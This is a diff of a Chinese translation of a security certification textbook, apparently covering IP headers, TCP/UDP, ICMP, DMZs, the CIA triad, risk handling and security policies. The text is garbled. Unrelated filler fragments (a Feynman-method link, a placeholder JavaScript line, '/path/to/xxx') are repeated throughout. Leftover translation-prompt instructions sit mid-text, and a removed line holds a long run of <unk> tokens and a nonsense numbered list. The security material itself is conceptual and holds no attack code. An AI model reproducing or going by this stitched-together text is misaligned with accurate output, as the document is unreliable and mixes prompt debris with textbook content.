+*   **Type of Service**   RFC 称之为 ToS 字段，也称为 differentiated services field。该字段帮助网络元素在 QoS 决策中对报文进行优先级排序，降低其他报文的优先级。它是 8 位（1 字节）的字段。
 
-*   **Total Length**   该字段表示报文的总长度，包括 IPv4 头部及随后的数据。它不包括之后添加的层 2 头部。该字段长 2 字节，允许的最大报文长度为 65,535 字节。
+*   **Total Length**   该字段表示报文的总长度，包括 IPv4 头部及随后的数据。它不包括之后添加的层 2 头部。该字段长 2 字节，允许的最大报文长度为 65,535 字节。
 
-*   **Identification**   当数据量超过长度字段所能容纳的最大值时，需要进行分片。所有发送的报文都会设置该字段，但在有分片时才有意义。所有分片共享相同的 identification 值。
+*   **Identification**   当数据量超过长度字段所能容纳的最大值时，需要进行分片。所有发送的报文都会设置该字段，但在有分片时才有意义。所有分片共享相同的 identification 值。
 
-*   **Flags**   该字段占 3 位。其中一位保留，第二位指示报文是否可以分片（即 DF 位）。若设置，表示不分片。第三位用于指示是否还有后续分片。若设置，表示还有更多分片；若为 0（未置位），则是最后一个分片。自包含的报文（无需分片）则该位为 0。
+*   **Flags**   该字段占 3 位。其中一位保留，第二位指示报文是否可以分片（即 DF 位）。若设置，表示不分片。第三位用于指示是否还有后续分片。若设置，表示还有更多分片；若为 0（未置位），则是最后一个分片。自包含的报文（无需分片）则该位为 0。
 
-*   **Fragment Offset**   该字段长 13 位，指示数据在数据包中的对齐位置，帮助接收系统在拼接分片时知道如何组合。该值以双字（8 字节）为单位。
+*   **Fragment Offset**   该字段长 13 位，指示数据在数据包中的对齐位置，帮助接收系统在拼接分片时知道如何组合。该值以双字（8 字节）为单位。
 
-*   **Time to Live**   TTL 字段指示报文在网络中存活的时间，理论上以秒计。但每个网络节点在处理报文时都会递减该值。由于报文可能在多个节点之间传递多个秒，最初的 TTL 定义已不再适用，实际意义转化为报文可经过的网络节点（路由设备）数量。当值为 0 时，报文被丢弃，并向发送者返回错误信息。该字段长 8 位。
+*   **Time to Live**   TTL 字段指示报文在网络中存活的时间，理论上以秒计。但每个网络节点在处理报文时都会递减该值。由于报文可能在多个节点之间传递多个秒，最初的 TTL 定义已不再适用，实际意义转化为报文可经过的网络节点（路由设备）数量。当值为 0 时，报文被丢弃，并向发送者返回错误信息。该字段长 8 位。
 
-*   **Protocol**   该字段是一个数值，指示接下来的传输层协议。它是 8 位的，告诉接收系统在传输层头部中查找哪些字段。在 Figure 2.9 所示的数据包中，该值为 17，表示是 UDP 消息。
+*   **Protocol**   该字段是一个数值，指示接下来的传输层协议。它是 8 位的，告诉接收系统在传输层头部中查找哪些字段。在图 2.9 所示的数据包中，该值为 17，表示是 UDP 消息。
 
-*   **Checksum**   该字段为 16 位，用于验证头部完整性。它是 16 位词的 1's complement 求和。
+*   **Checksum**   该字段为 16 位，用于验证头部完整性。它是 16 位词的 1's complement 求和。
 
-*   **Source Address**   该字段是发送报文的 IPv4 地址，长度为 4 字节。
+*   **Source Address**   该字段是发送报文的 IPv4 地址，长度为 4 字节。
 
-*   **Destination Address**   该字段是目标 IPv4 地址，同样长度为 4 字节。
+*   **Destination Address**   该字段是目标 IPv4 地址，同样长度为 4 字节。
 
 ### Addressing
-
-
 
 IP 版本 4 地址长度为 4 个字节。它们通常以点号分隔的形式显示（例如 192.168.1.1），因此有时被称为 `dotted quads`（点分四段）或 `dotted decimal` 表示法。由于每个值为 8 位，可能的取值范围是 0 到 255。并非所有值，尤其是前两个字节中的值，都被使用。有一些地址被保留用于特殊用途。例如，地址范围 127.0.0.0–127.255.255.255 保留用于回环地址。这些地址指向它们所在的主机。回环接口确保系统始终有一个网络接口，并允许在不向系统外部发送流量的情况下通过网络进行测试。常见的回环地址是 127.0.0.1，但该范围内的任何地址都可以使用。
 
@@ -1983,19 +2140,6 @@ IP 地址通过连续的地址聚合成网络，这一点适用于 IPv4 与 IPv6
 
 另一种表示网络块的方法是 CIDR 记法（Classless Inter‑Domain Routing），即只给出前缀长度（即有多少位用于网络）。前缀指示哪些位用于网络。上面的子网掩码对应 /25 前缀，因而可以用 172.20.30.42/25 表示该子网。使用这种记法在思考 2 的幂次时会更方便。
 
-
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
-
-```
-if (condVar > someVal) {console.log("xxx")}
-```
-
-
-
 # TCP 与 UDP
 
 ## TCP 的可靠传输机制
@@ -2007,25 +2151,29 @@ TCP 是面向连接的传输层协议，其可靠性主要体现在三次握手�
 TCP 使用 **三次握手**（three‑way handshake）来建立连接。握手过程如下：
 
 1. **SYN**：客户端发送 SYN 报文，`seq = x`，标记 SYN 位并设置初始序列号 `x`（随机值）。
+
 2. **SYN‑ACK**：服务器收到 SYN 后返回 SYN‑ACK 报文，`ack = x + 1`，`seq = y`，同时将 ACK 位置 1，表示已收到客户端的同步请求。
+
 3. **ACK**：客户端返回 ACK 报文，`ack = y + 1`，`seq = x + 1`，完成连接建立。
 
-![FIGURE 2.11 Three‑way handshake](img/c02f011.png)
+![图 2.11 三次握手](img/c02f011.png)
 
-**FIGURE 2.11** Three‑way handshake
+**图 2.11 三次握手**
 
 握手确保双方都处于活动状态，并且双方能够互相确认对方的存在。
 
 ### 确认号与序列号的作用
 
 - **序列号（sequence number）**：表示已发送的字节数，用于标识发送的数据段。
+
 - **确认号（acknowledgment number）**：告知对方已成功收到的字节数，若确认号不前进，则表明数据段丢失，需要重传。
 
 TCP 通过重传机制保证可靠交付，最多可重传 `RTO`（重传超时）次数，超过后仍未收到确认则视为丢包。
 
 ### 代码示例
 
-```if (condVar > someVal) {console.log("xxx")}
+```
+if (condVar > someVal) {console.log("xxx")}
 ```
 
 ## UDP 的轻量特性
@@ -2037,9 +2185,14 @@ UDP 是无连接的传输层协议，几乎没有可靠性保证，开销极小�
 UDP 头部包含四个 16 位字段：
 
 - **源端口（source port）**
+
 - **目的端口（destination port）**
+
 - **长度（length）**
+
 - **检验和（checksum）**
+
+
 
 其中，**源端口** 是可选的，因为 UDP 不需要建立连接，服务器可能不会返回响应。
 
@@ -2059,6 +2212,7 @@ UDP 适用于对延迟敏感、对顺序性要求不高的应用，例如 **流�
 在网络路径变化时，报文可能通过不同的路径到达接收端，导致**乱序**或**丢失**。例如：
 
 - 原路径：`A → B → C → D`
+
 - C 失效后，路径改为 `A → E → F → D`，在传输过程中已在飞行的报文可能被延迟或重新排序。
 
 应用层需要自行处理乱序和丢包，这也是为什么实时应用倾向于使用 UDP。
@@ -2066,8 +2220,6 @@ UDP 适用于对延迟敏感、对顺序性要求不高的应用，例如 **流�
 ## Internet Control Message Protocol (ICMP)
 
 ICMP 用于网络层的误差报告和控制消息，其中 **“目的地不可达”**（port unreachable）代码用于指示 UDP 端口不可达的情况，但不指定具体的传输层协议。
-
-
 
 -   ICMP 是一种特殊的协议，在协议方面它不携带用户数据。相反，它与其他协议协同工作，提供错误和控制消息。当网络出现意外情况时，设备会生成 ICMP 消息并返回给发起设备，以告知存在问题。它位于 IP 之上，因为它需要 IP 的寻址功能，但它被视为 Internet 层的一部分，与 IP 本身同属。这也使它成为一种相当不寻常的协议，因为它位于网络层之上，但并不是传输层协议。
 
@@ -2081,7 +2233,7 @@ ICMP 定义于 RFC 792，其中包含 8 字节的报头。报头包括类型和�
 
 我们已经讨论了拓扑结构，它们有助于提供网络的概念性、逻辑性表示。然而，网络本身还有更大的背景。将拓扑结构与数据流以及其他网络元素结合起来，就会得到网络架构。它描述了使用的协议以及它们的使用位置，同时可能包含网络安全域作为网络架构的一部分。你还需要考虑多位置的情况。
 
-从安全角度来看，还需要考虑的其他元素包括隔离。这可能意味着根据使用情况和风险对系统进行分类。那些需要直接面向 Internet 的系统 —  — 也就是说，外部用户会作为正常操作来建立网络连接的系统 —  — 可能会被单独保存并受到保护，以免与用户使用或存储敏感数据的系统发生混淆。
+从安全角度来看，还需要考虑的其他元素包括隔离。这可能意味着根据使用情况和风险对系统进行分类。那些需要直接面向 Internet 的系统 — — 也就是说，外部用户会作为正常操作来建立网络连接的系统 — — 可能会被单独保存并受到保护，以免与用户使用或存储敏感数据的系统发生混淆。
 
 ### 网络类型
 
@@ -2106,8 +2258,6 @@ ICMP 定义于 RFC 792，其中包含 8 字节的报头。报头包括类型和�
 ![FIGURE 2.13 DMZ network](img/c02f013.png)
 
 **FIGURE 2.13** DMZ network
-
-
 
 如果您使用的是 DMZ，这意味着网络隔离，并且对访问网络的控制更加严格，规则更加限制性。网络分段也可以隔离其他系统，而不一定需要引入防火墙规则或访问控制列表。您可以看到还有用于内部服务器以及桌面网络的网络段。此外，可能还有许多其他网络段。每个网络段都有不同的信任级别。例如，可能还有一个供访客（guest）网络，允许供应商和其他访客访问网络，但他们无法访问任何内部系统。
 
@@ -2141,8 +2291,6 @@ DMZ 并不是唯一的网络隔离方式。保护网络免受面向 Internet 的
 
 随后，像 Amazon 和 Google 这样的公司拥有大量系统，有时这些系统闲置。这些公司开发了服务，让企业可以使用这些闲置系统。由于这些服务通过 Internet 提供，而非本地提供，它们被描述为“在云端”。云计算服务有多种形态。第一种，也是今天使用最广泛的，是存储即服务（SaaS）。
 
-
-
 进入`/path/to/xxx`目录，找到`xxx.json`。
 
 在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`
@@ -2154,8 +2302,6 @@ DMZ 并不是唯一的网络隔离方式。保护网络免受面向 Internet 的
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 Figure 2.16 显示了亚马逊云科技（Amazon Web Services）市场中可用的一些应用程序的小集合。选择其中一个应用后，根据需求，会启动带有所需操作系统的虚拟机，并且该应用已预先安装。除了市场中提供的应用外，您还可以创建自己的镜像，这些镜像以 Amazon Machine Images（AMI）的形式存储。这可能是必要的，如果公司拥有自行开发、在内部使用的应用程序，需要在虚拟机上运行。一旦有了 AMI，就可以按需启动多个该镜像的实例。
 
@@ -2197,31 +2343,33 @@ Figure 2.16 显示了亚马逊云科技（Amazon Web Services）市场中可用�
 
 ## 摘要
 
+
+
 网络化计算系统根本改变了我们的商业、工作和生活方式，且在很短的时间内完成。计算机网络还提供了远程攻击个人和企业的便利手段，改变了某些犯罪组织的运作方式，并提供了轻松实施欺诈和盗窃的途径。正因如此，以及后续章节大量内容依赖于网络，理解计算机网络的基础变得非常有价值。
 
+粗体（**bold**）和斜体（*itatic*）需要翻译翻译内容并保留符号。
 
+内联代码（`code`）和代码块不需要翻译。
 
-粗体（**bold**）和斜体（*itatic*）需要翻译翻译内容并保留符号。  
-内联代码（`code`）和代码块不需要翻译。  
-链接（[link](https://example.org)）需要翻译其内容，但保留网址。  
-列表，表格，引用块保留格式，翻译内容  
-原文可能有多行，不要漏掉任何一行，并且注意一定不要重复输出原文！！！  
-输出应包含在“[content]...[/content]”中  
+链接（[link](https://example.org)）需要翻译其内容，但保留网址。
 
+列表，表格，引用块保留格式，翻译内容
 
+原文可能有多行，不要漏掉任何一行，并且注意一定不要重复输出原文！！！
 
+输出应包含在“[content]...[/content]”中
 
 4. `Addressing` systems on the local `network`
 
-# 第 3 章  
+# 第 3 章
 
-## 安全基础  
+## 安全基础
 
 组织通常在防御和减缓攻击方面投入大量时间和金钱。这些防御的规划与实施涉及一些基础概念。本章我们将介绍一些帮助安全专业人员决定如何最好保护企业的主题。其中一些是基础性的，也就是说它们在 CEH 考试中可能不会专门出现，但为了在此基础上构建更高级的防护措施，必须覆盖这些内容。本章结束时，你将掌握基础知识，并开始讨论困难的防御机制。如果你是伦理黑客，你会在工作中频繁遇到这些内容。
 
 首先，你需要理解信息安全的含义——哪些事件属于安全范畴。这些概念通常被称为三元论或 CIA 三元论。它是信息安全专业人员（CISSP）认证的核心概念，该认证涵盖信息安全的全部领域。CIA 三元论是理解信息安全其他方面的良好基础。
 
-除了知道你要防范什么，你还需要知道*你*在保护什么。进行风险评估可以帮助你实现这一点。识别潜在风险及其可能的损失，有助于在有限资源（预算、人力、资本支出等）分配方面做出决策。它还能帮助安全专业人员确定需要建立的政策，以指导员工及信息技术人员的整体和具体行动。从政策衍生出标准和程序，它们都是确定公司如何保护信息资产的必要组成部分。
+除了知道你要防范什么，你还需要知道`你`在保护什么。进行风险评估可以帮助你实现这一点。识别潜在风险及其可能的损失，有助于在有限资源（预算、人力、资本支出等）分配方面做出决策。它还能帮助安全专业人员确定需要建立的政策，以指导员工及信息技术人员的整体和具体行动。从政策衍生出标准和程序，它们都是确定公司如何保护信息资产的必要组成部分。
 
 在政策就位后，可以决定如何最好保护信息资源。除了人力资源，还可以利用技术手段。网络中可以部署多种设备来协助信息保护。这些设备既能阻止攻击者，也能提供识别入侵的信息，包括攻击者用来获取网络和系统访问的路径。此外，网络中还可能部署能够自动检测并阻止入侵尝试的元素。
 
@@ -2229,7 +2377,7 @@ Figure 2.16 显示了亚马逊云科技（Amazon Web Services）市场中可用�
 
 ## 三元论
 
-三元论是由三个属性或特性定义的，它们共同决定了安全的含义。这三个元素分别是**保密性**、**完整性**和**可用性**。在制定安全计划时，必须同时考虑这三个属性。它们的重要性各不相同，但在规划防御措施时，每一个都至关重要。并不是所有的防御措施都会同等程度地涉及这三个属性，例如某些防御只影响单一属性。从攻击者的视角来看，他们会试图 compromising（妥协）其中的一个元素。你常常会看到这三个元素统称为 CIA 三元论，这与中央情报局（CIA）无关。
+三元论是由三个属性或特性定义的，它们共同决定了安全的含义。这三个元素分别是`保密性`、`完整性`和`可用性`。在制定安全计划时，必须同时考虑这三个属性。它们的重要性各不相同，但在规划防御措施时，每一个都至关重要。并不是所有的防御措施都会同等程度地涉及这三个属性，例如某些防御只影响单一属性。从攻击者的视角来看，他们会试图`compromising`（妥协）其中的一个元素。你常常会看到这三个元素统称为 CIA 三元论，这与中央情报局（CIA）无关。
 
 Figure 3.1 以三角形形式展示了三元论的三个元素，因为三角形通常用来象征三者平等。在等边三角形中，三条边长度相同，这象征三个属性的权重相等，表明没有任何一个属性比其他属性更重要。整体组织的安全状态需要三者均衡，虽然不同情境下可能突出不同的元素，但在整体安全考量中，三者应同等重要，以保持安全姿态的平衡。
 
@@ -2245,21 +2393,11 @@ Figure 3.1 以三角形形式展示了三元论的三个元素，因为三角形
 
 当朋友泄露你的秘密时（假设他们确实如此），他们就违背了你的信任。你的秘密不再保密，你也就无法确定是否还能信任这位朋友。一个挑战是你可能把秘密告诉了两位朋友，随后从其他人那里听到这个秘密。你不知道是哪位朋友泄露的，只知道保密性已经被侵犯。
 
-在数字世界，保密性仍然意味着保护秘密，核心概念未变。这涵盖了众多方面：确保没有人未经授权访问信息，例如使用强密码防止攻击者登录。也可以将某些信息离线存储，防止远程访问。常见的做法是通过**加密**来实现保密性。
+在数字世界，保密性仍然意味着保护秘密，核心概念未变。这涵盖了众多方面：确保没有人未经授权访问信息，例如使用强密码防止攻击者登录。也可以将某些信息离线存储，防止远程访问。常见的做法是通过`加密`来实现保密性。
 
-在讨论保密性时，我们需要从**静态**和**动态**两个维度来看待：静态是指保护“静止”的数据，即“at rest”状态，通常存储在磁盘上且未被使用或操作；动态是指数据在传输时的状态，即“in motion”，例如浏览器向服务器请求并获取信息的过程。传输过程使数据成为动态的，而不一定意味着数据在传输过程中被篡改，但数据在不同系统之间移动时确实可能遭遇篡改。
+在讨论保密性时，我们需要从`静态`和`动态`两个维度来看待：静态是指保护“静止”的数据，即“at rest”状态，通常存储在磁盘上且未被使用或操作；动态是指数据在传输时的状态，即“in motion”，例如浏览器向服务器请求并获取信息的过程。传输过程使数据成为动态的，而不一定意味着数据在传输过程中被篡改，但数据在不同系统之间移动时确实可能遭遇篡改。
 
-
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_methods<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk> 1. 20 min
-2. 30 min
-3. 30 min
-3. 30 min
-4. 10 min
-10. 10 min
-
-
+-   [费曼学习法](https://wiki.example.org/feynmans_learning_methods)
 
 -   **真实性**   有时被称为不可否认性。真实性的概念是数据或文档的来源就是它所声称的那样。例如，当你数字签署一封电子邮件时，收件人可以确定该消息来源于你，因为消息中包含了你的数字签名，而没有其他人应该拥有。当然，实际上我们只知道消息是用你的密钥签署的。如果你的密钥被窃取或分发，它仍然可以被用于你。真实性是确保当你收到一段数据，无论是什么，它确实来自它声称的来源。
 
@@ -2289,108 +2427,116 @@ Figure 3.1 以三角形形式展示了三元论的三个元素，因为三角形
 
 
 
+当涉及风险时，还有其他需要考虑的概念。第一个概念是`威胁`。威胁是指有可能导致`保密性`、`完整性`或`可用性`泄露的事项。该泄露可能的途径称为`漏洞`。漏洞是系统中的弱点，可能体现在`其软件`、`配置`或`整个信息解决方案的组合方式`上。当漏洞被触发时，称为`利用`。我们利用漏洞，但并非所有漏洞都能被利用。`时序条件`是一种可能无法被利用的漏洞示例。代码审查显示存在问题，其结果可能导致`数据损坏`——例如。然而，由于程序执行的速度，几乎不可能在两条指令之间插入修改。显然，并非所有漏洞都能被任何人利用。
 
-当涉及风险时，还有其他需要考虑的概念。第一个概念是**威胁**。威胁是指有可能导致**保密性、完整性或可用性**泄露的事项。该泄露可能的途径称为**漏洞**。漏洞是系统中的弱点，可能体现在**其软件、配置或整个信息解决方案的组合方式**上。当漏洞被触发时，称为**利用**。我们利用漏洞，但并非所有漏洞都能被利用。**时序条件**是一种可能无法被利用的漏洞示例。代码审查显示存在问题，其结果可能导致**数据损坏**——例如。然而，由于程序执行的速度，几乎不可能在两条指令之间插入修改。显然，并非所有漏洞都能被任何人利用。
+`威胁实体`或`威胁行为体`是一个实体，如个人或团体，能够实例化威胁。威胁实体是`威胁的实现者`。威胁实体利用漏洞的路径称为`威胁向量`。所有这些概念都很重要，因为它们帮助更好地理解风险所在。一旦你确定了关心的资源，就应思考哪些`威胁实体`可能关注这些资源。这有助于识别潜在的`漏洞`。一旦你知道了你的`漏洞`以及可能的`威胁向量`，就可以开始思考如何`防范`这些威胁。
 
-**威胁实体**或**威胁行为体**是一个实体，如个人或团体，能够实例化威胁。威胁实体是**威胁的实现者**。威胁实体利用漏洞的路径称为**威胁向量**。所有这些概念都很重要，因为它们帮助更好地理解风险所在。一旦你确定了关心的资源，就应思考哪些**威胁实体**可能关注这些资源。这有助于识别潜在的**漏洞**。一旦你知道了你的**漏洞**以及可能的**威胁向量**，就可以开始思考如何**防范**这些威胁。
+`信息保障`是识别信息资产风险并实施控制以更好保护资产或资源的实践。控制是确保信息安全资源的`保密性`、`完整性`或`可用性`的手段。这些控制可能是`预防性`、`检测性`或`纠正性`的。它们的目标或功能就是这些控制的定义。预防性控制旨在`防止不良事件发生`。不幸的是，这并非总是可行，因此`检测性控制`很有用。检测性控制是指`发现`保密性、完整性或可用性的违规行为，以便进行处理。最后，`纠正性控制`旨在`限制已造成的损害范围`。
 
-**信息保障**是识别信息资产风险并实施控制以更好保护资产或资源的实践。控制是确保信息安全资源的**保密性、完整性或可用性**的手段。这些控制可能是**预防性、检测性**或**纠正性**的。它们的目标或功能就是这些控制的定义。预防性控制旨在**防止不良事件发生**。不幸的是，这并非总是可行，因此**检测性控制**很有用。检测性控制是指**发现**保密性、完整性或可用性的违规行为，以便进行处理。最后，**纠正性控制**旨在**限制已造成的损害范围**。
+安全控制有两个因素。除了前文所述的`目标`之外，它们还属于三种类型之一。控制可分为`技术型`、`行政型`或`物理型`。技术控制是`硬件或软件`，已被实施以保护资产。这可能包括`身份验证方案`、`防火墙`、`防病毒软件`，或`安全事件与事件管理（SIEM）`，用于警报告知不良事件的发生。行政控制是`政策`、`程序`或`指南`，指导如何实施保护措施。物理控制则用于`在物理层面阻止人们接近资产`，即防止有人直接走到建筑物并进入。物理控制不涉及`逻辑访问`，例如远程登录 SSH 服务器。物理控制可能是`门锁`，也可能是`闭路电视摄像头`，用于观察活动以检测不良行为。
 
-安全控制有两个因素。除了前文所述的**目标**之外，它们还属于三种类型之一。控制可分为**技术型、行政型**或**物理型**。技术控制是**硬件或软件**，已被实施以保护资产。这可能包括**身份验证方案、防火墙、防病毒软件**，或**安全事件与事件管理（SIEM）**，用于警报告知不良事件的发生。行政控制是**政策、程序或指南**，指导如何实施保护措施。物理控制则用于**在物理层面阻止人们接近资产**，即防止有人直接走到建筑物并进入。物理控制不涉及**逻辑访问**，例如远程登录 SSH 服务器。物理控制可能是**门锁**，也可能是**闭路电视摄像头**，用于观察活动以检测不良行为。
+信息保障关乎`风险管理`。这意味着不仅要识别风险并对其进行分类，还要就如何处理风险做出`业务决策`。企业通常会根据`风险等级`和`风险容忍度`——即企业对管理风险的舒适程度——采取不同的风险处理方式。这些就是企业内部常见的风险处理方式。
 
-信息保障关乎**风险管理**。这意味着不仅要识别风险并对其进行分类，还要就如何处理风险做出**业务决策**。企业通常会根据**风险等级**和**风险容忍度**——即企业对管理风险的舒适程度——采取不同的风险处理方式。这些就是企业内部常见的风险处理方式。
+*   `接受` 风险接受是一种`知情过程`，企业充分理解风险的本质，即`影响`（实际化风险将产生的金额）和`概率`，并选择不采取任何措施。这意味着如果风险实际发生，企业需对所有损失和成本负责，包括可能产生的其他损害。这种做法意味着对已识别风险相关的情形`不做任何其他处理`。
 
-*   **接受** 风险接受是一种**知情过程**，企业充分理解风险的本质，即**影响**（实际化风险将产生的金额）和**概率**，并选择不采取任何措施。这意味着如果风险实际发生，企业需对所有损失和成本负责，包括可能产生的其他损害。这种做法意味着对已识别风险相关的情形**不做任何其他处理**。
+*   `转移` 企业可能选择`将风险转移`给另一实体进行管理。常见的实现方式是`购买保险`。你几乎肯定为汽车和住房（或租赁住房）投保。你已选择将这些资产相关的风险转移给保险公司，即在发生索赔时，你转交风险，保险公司承担责任，以`保费`形式的金钱交换。
 
-*   **转移** 企业可能选择**将风险转移**给另一实体进行管理。常见的实现方式是**购买保险**。你几乎肯定为汽车和住房（或租赁住房）投保。你已选择将这些资产相关的风险转移给保险公司，即在发生索赔时，你转交风险，保险公司承担责任，以**保费**形式的金钱交换。
+*   `缓解` 风险缓解是实施`控制措施`以降低风险。风险减少可发生在构成风险的两个向量——`损失`和`概率`——上。你可以实施控制措施，降低风险被实现的`概率`。例如，通过实施`技术控制`，如`限制对资源的访问`至少数特定地点的人员。
 
-*   **缓解** 风险缓解是实施**控制措施**以降低风险。风险减少可发生在构成风险的两个向量——**损失**和**概率**——上。你可以实施控制措施，降低风险被实现的**概率**。例如，通过实施**技术控制**，如**限制对资源的访问**至少数特定地点的人员。
-
-*   **避免** 企业可能选择**不参与**可能引入风险的活动，这称为**风险避免**。这虽是合法做法，但如果该活动对业务至关重要，则可能无法实现。企业需选择其他方法，以在获得活动预期收益的同时管理风险。
+*   `避免` 企业可能选择`不参与`可能引入风险的活动，这称为`风险避免`。这虽是合法做法，但如果该活动对业务至关重要，则可能无法实现。企业需选择其他方法，以在获得活动预期收益的同时管理风险。
 
 ### Policies, Standards, and Procedures
 
-虽然我们信息安全专业人员常常把**安全本身**视为最重要的，但事实是**安全是业务使能器，而非业务驱动力**。这意味着在大多数情况下，**安全并不直接增加利润**。缺乏安全或安全弱点会**削弱利润**。由于安全是业务使能器，业务方会设定**重要事项**及**保护手段**的参数。它通过制定**政策**来实现。政策创建完成后，**标准**会基于这些政策构建。最接近实际工作的层面是**程序**。程序是依据标准开发的。
+虽然我们信息安全专业人员常常把`安全本身`视为最重要的，但事实是`安全是业务使能器，而非业务驱动力`。这意味着在大多数情况下，`安全并不直接增加利润`。缺乏安全或安全弱点会`削弱利润`。由于安全是业务使能器，业务方会设定`重要事项`及`保护手段`的参数。它通过制定`政策`来实现。政策创建完成后，`标准`会基于这些政策构建。最接近实际工作的层面是`程序`。程序是依据标准开发的。
 
 #### Security Policies
 
-安全策略是一份关于**业务资源**的意图声明。它定义了公司认为的**安全**——即需要保护的资源、资源应如何正确使用、资源如何或应如何被访问。这些策略对于良好的**企业治理**至关重要，因为它们是管理层划定的界限。这意味着管理层设定基调和方向不仅是好主意，也是**必须**的。管理层和董事会有义务对业务的**利益相关方**（即个体所有者或股东）负责。
+安全策略是一份关于`业务资源`的意图声明。它定义了公司认为的`安全`——即需要保护的资源、资源应如何正确使用、资源如何或应如何被访问。这些策略对于良好的`企业治理`至关重要，因为它们是管理层划定的界限。这意味着管理层设定基调和方向不仅是好主意，也是`必须`的。管理层和董事会有义务对业务的`利益相关方`（即个体所有者或股东）负责。
 
-安全策略不仅定义重要资源，也设定**员工的期望**。例如，许多组织制定**可接受使用政策**，规定用户可以或不可以做什么。员工违反该政策的行为通常会导致**纪律处分或解雇**，具体取决于违规程度及对业务的影响。当然，并非所有策略都直接针对用户行为。还有其他安全策略更侧重于**信息技术或信息安全人员**。
+安全策略不仅定义重要资源，也设定`员工的期望`。例如，许多组织制定`可接受使用政策`，规定用户可以或不可以做什么。员工违反该政策的行为通常会导致`纪律处分或解雇`，具体取决于违规程度及对业务的影响。当然，并非所有策略都直接针对用户行为。还有其他安全策略更侧重于`信息技术或信息安全人员`。
 
+-   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者`Richard Feynman`。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
-虽然攻击者类型各异，包括可能仅旨在让公众意识到某种观点的 **hacktivists**，但最危险的往往是被称为 `advanced persistent threats` (`APT`) 的攻击者。这些攻击者使用大量的 **TTPs** 来进入企业环境，并尽可能长时间地保持在环境内。在某些情况下，这些攻击者可能驻留数年。最近的记忆中，已有攻击者被发现长期停留七年、十年或更久。虽然也会出现只进行一次攻击、针对个人用户、快速获取目标后离开的攻击者，但我们看到的越来越多的是这类 APT 攻击者。在查看 ATT&CK 框架的不同阶段时，这点值得注意。
